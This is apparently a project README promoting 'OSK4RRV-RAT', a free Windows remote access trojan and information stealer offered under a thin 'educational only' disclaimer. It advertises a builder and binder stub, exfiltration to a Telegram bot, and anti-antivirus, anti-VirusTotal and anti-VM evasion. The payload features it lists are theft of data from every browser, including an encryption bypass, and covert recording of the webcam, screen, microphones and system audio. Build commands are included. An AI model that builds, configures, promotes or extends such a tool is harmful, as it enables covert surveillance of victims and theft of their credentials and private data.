# OSK4RRV-RAT

**Free Windows information grabber for educational purposes only!**
> Educational project. Use only on systems you own or have explicit permission to test. DO NOT EVER RUN IT ON SOMEBODY DEVICE. RUNNING IT ON SOMEBODYS DEVICE IS ILLEGAL!

## Payload
Our Payload is special, grabs all info being undetected and fast.
We provide much functions like Anti-VT Bypass:
<img width="1884" height="703" alt="image" src="https://github.com/user-attachments/assets/043c6fbc-0564-4030-b57d-e0539e4f8cc9" />

---
## Features

### Builder
- Nice GUI - Ideal for beginners.
- Telegram endpoint
- Fast&Good Builder
- Session id's
- **Endpoint tab** for Telegram bot configuration
- **Settings tab** for App Auth Token management

### Payload (configurable)
- Every Browser on PC data export (With bypassed Appbound V20 Encryption)
- Anti-AV
- Anti-VT
- Anti-VM
- Webcam grab (MP4 with LED support)
- Screen recording (Full screen including taskbar)
- Screenshot (excludes taskbar)
- Every PC Monitor recording
- Every microphone device record
- IP Grab
- PC Name grab

---

## Authentication Token

**Default App Auth Token:** `sk-7nR9pL2mK8qW5vT3`

You can change this token in the **Settings** tab of the GUI. The token is stored in
`%APPDATA%\AppDataCfg\config.ini` and is required every time the builder starts.

---

## Requirements
- **Windows 10/11** x64 | This is the target platfrom. u cant run my project on Linux or MacOS

For developers (optional)
- **Visual Studio 2022** | Edit etc.
- **CMake ≥ 3.20** | Project Builder (NEEDS VS22 C++ TOOLS)

---

## How to build?
First make sure u have installed CMake and VS22 C++ Tools.

```powershell
# From repo root
cmake -S . -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
```

**Outputs**
```
build/Release/OSK4RRV-RAT.exe   # builder UI
build/Release/binder.exe        # binder stub
build/Release/payload.exe       # payload worker
```

The builder runs as a normal user (no admin required). The final executable it produces
inherits the **same privileges as the original file you selected** — if the original has
no admin shield, the output has none either.

### Recording (no ffmpeg required)

Screen recording and webcam capture use a built-in Windows recorder that writes real
**MP4 / H.264** files via Media Foundation — nothing extra has to be shipped:

- `screen/screen_record.mp4` — full virtual desktop at native resolution, **taskbar included**
- `webcam/webcam.mp4` — camera clip up to 1280x720

Screen recordings also capture **audio automatically**: the microphone and the system
output (WASAPI loopback, with a Stereo Mix fallback) are mixed together over the exact
same time window as the video and muxed in as AAC. The webcam clip records the
microphone. Both tracks are normalised to 44.1 kHz stereo, so video and audio always
line up.

If an `ffmpeg.exe` is placed next to the builder it will be embedded into the output and
used as an alternative encoder; the native MP4 path is the default and always available.

---
## You see some bugs or need some support? 
Contact me @osk4rrv on telegram
or
Contact me @osk4rrv_alt on discord

---

## License

See [LICENSE](./LICENSE).

---

<p align="center">
  <sub>OSK4RRV-RAT · Best Free Educational tool in this category.</sub>
</p>
